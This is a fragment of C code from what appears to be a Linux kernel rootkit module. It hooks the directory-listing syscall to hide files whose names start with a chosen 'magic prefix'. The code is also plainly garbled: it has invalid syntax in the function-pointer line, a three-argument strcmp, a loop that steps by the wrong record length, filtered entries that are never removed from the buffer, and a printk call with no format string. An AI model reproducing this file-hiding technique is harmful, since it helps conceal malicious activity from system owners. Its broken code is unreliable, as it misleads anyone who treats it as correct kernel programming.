...
module_param(magic_prefix, charp, 0000);
...
{
	// temp pointer of iinux_dirent to help in iterating and hiding files
	struct linux_dirent *temp;
	
	ret = int (*orig_func)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
	t_syscall_hook *execve_hook;
	...
	//Allocate a kernel buffer of the correct size using kmalloc
	buf = kmalloc(count, GFP_KERNEL);
	
	//Copy the userland buffer into your kernel buffer using copy_from_user
	copy_from_user(buf,dirp,count);
	
	//remove dirent structurs we dont want seen
	for (i=j=0; i<ret; i+= dirp->d_reclen){
		//set temp to be current directory entry at i 
		temp = (struct linux_dirent *) (buf + i);
		
		//skip files we dont want to be seen
		if (strcmp(temp->d_name, magic_prefix,  sizeof(magic_prefix) -1) == 0)
			continue;
		
		j+= temp->d_reclen;
	}
	
	//copy to user after edit
	copy_to_user(dirp, buf, count);
	
	//free buffer to avoid leak
	kfree(buf);
	
	//print dirent entries
	printk(KERN_INFO "entry: ", dirp->d_name);
